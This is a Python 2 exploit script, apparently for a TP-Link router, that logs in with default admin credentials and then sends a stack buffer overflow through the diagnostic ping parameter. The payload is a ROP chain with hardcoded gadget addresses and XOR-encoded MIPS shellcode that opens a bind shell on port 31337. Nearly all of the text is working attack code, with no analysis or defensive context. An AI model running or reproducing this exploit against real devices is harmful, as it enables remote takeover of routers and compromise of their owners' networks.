import urllib2
import urllib
import base64
import hashlib
import os
def login(ip, user, pwd):
    #### Generate the auth cookie of the form b64enc('admin:' + md5('admin'))
    hash = hashlib.md5()
    hash.update(pwd)
    auth_string = "%s:%s" %(user, hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    print "[debug] Encoded authorisation: %s" %encoded_string
    #### Send the request
    url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
    print "[debug] sending login to " + url
    req = urllib2.Request(url)
    req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
    resp = urllib2.urlopen(req)
    #### The server generates a random path for further requests, grab that here
    data = resp.read()
    next_url = "http://%s/%s/userRpm/" %(ip, data.split("/")[3])
    print "[debug] Got random path for next stage, url is now %s" %next_url
    return (next_url, encoded_string)#custom bind shell shellcode with very simple xor encoder
    #followed by a sleep syscall to flush cash before running
    #bad chars = 0x20, 0x00

shellcode = (
    #encoder
    "\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99"
    "\x27\xb2\x05\x9f"
    "\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9"
    "\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41"
    "\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d"
    "\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71"
    "\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d"
    "\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99"
    "\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5"
    "\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad"
    "\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9"
    "\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1"
    "\x02\x2a\x18\x26\xae\x43\xff\xc1"#sleep
    "\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08"
    "\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
    "\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c"################ encoded shellcode ###############
    "\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06"
    "\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff"
    "\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d"
    "\x7a\x69"            #&lt;------------------------- PORT 0x7a69 (31337)
    "\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad"
    "\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc"
    "\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01"
    "\x01\x0c\x24\x0f\x73\x50"
    "\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f"
    "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48"
    "\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f"
    "\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50"
    "\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f"
    "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c"
    "\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce"
    "\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8"
    "\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02"
    "\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
    "\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c"
    )###### useful gadgets #######
nop = "\x22\x51\x44\x44"
gadg_1 = "\x2A\xB3\x7C\x60"
gadg_2 = "\x2A\xB1\x78\x40"
sleep_addr = "\x2a\xb3\x50\x90"
stack_gadg = "\x2A\xAF\x84\xC0"
call_code = "\x2A\xB2\xDC\xF0"
def first_exploit(url, auth):
#                      trash      $s1        $ra
    rop = "A"*164 + gadg_2  + gadg_1 + "B"*0x20 + sleep_addr
    rop += "C"*0x20 + call_code + "D"*4 + stack_gadg + nop*0x20 + shellcode
    params = {'ping_addr': rop, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}
    new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)
    print "[debug] sending exploit..."
    print "[+] Please wait a few seconds before connecting to port 31337..."
    req = urllib2.Request(new_url) 
    req.add_header('Cookie', 'Authorization=Basic %s' %auth)
    req.add_header('Referer', url + "DiagnosticRpm.htm")                         
    resp = urllib2.urlopen(req)
if __name__ == '__main__':
    data = login("192.168.0.1", "admin", "admin")
    first_exploit(data[0], data[1])
